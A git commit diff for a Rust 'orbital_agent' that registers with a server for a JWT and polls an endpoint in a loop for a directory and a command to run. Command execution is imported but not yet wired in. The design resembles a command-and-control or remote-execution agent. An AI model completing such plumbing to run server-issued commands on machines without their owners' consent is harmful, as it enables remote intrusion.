45b652257b9b9ec482283a7feffccb275bdb444a
ceald1 <ceald@ceald.cc>
2025-07-08 13:58:21 -0700

    adding more to agent

--- orbital_agent/src/main.rs
+++ orbital_agent/src/main.rs
@@ -1,10 +1,11 @@
 use clap::{builder::Str, Parser};
 use reqwest;
-use serde_json::{Result, Value};
+use serde_json::{Map, Result, Value};
 use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
+use std::{any::Any, collections::HashMap, ops::Index, str::FromStr};
 use reqwest::Error;
-
+use std::process::Command;
+use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION};
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
@@ -22,18 +23,31 @@ struct RegisterResponse {
     message: String,
 }
 
+#[derive(Deserialize, Debug)]
+struct CMDResponse {
+    message: CMDInternalResp,
+}
+
+#[derive(Deserialize, Debug)]
+struct CMDInternalResp {
+    dir: String,
+    cmd: String,
+}
+
 #[tokio::main]
 async fn main() {
     let args = Args::parse();
-    let agent_id = args.agent_id;
+    let agentid = args.agent_id;
     let url = args.url;
 
-    let jwt_token = register(&agent_id, &url).await;
+    let jwt_token = register(&agentid, &url).await;
 
     loop {
-        let command = getCommand(&jwt_token, &url, &agent_id).await;
-        println!("Received command: {}", command);
-        // Do something with the command...
+        let cmdResp = get_command(&jwt_token, &url, &agentid).await;
+        let dir = cmdResp.dir;
+        let cmd = cmdResp.cmd;
+        
+
     }
 }
 
@@ -57,14 +71,25 @@ async fn register(agent_id: &String, url: &String) -> String {
     };
 }
 
-async fn getCommand(token: &String, url: &String, agent_id: &String) -> String {
-    let cmd = "".to_string();
+async fn get_command(token: &String, url: &String, agent_id: &String) -> CMDInternalResp {
     let mut new_url = url.clone();
     new_url.push_str(agent_id);
     new_url.push_str("/plan");
-    
+    let agent_token = format!("{}", token);
 
-    return cmd;
+    let mut headers = HeaderMap::new();
+    headers.insert(
+        AUTHORIZATION,
+        HeaderValue::from_str(&agent_token).unwrap(), // handle error as needed
+    );
+    let response = reqwest::Client::new().get(new_url).headers(headers).send().await.unwrap();
+    let result: CMDResponse = response
+        .json()
+        .await
+        .expect("Failed to parse JSON response");
+
+    let data = result.message;
+    return data;
 }
 
 
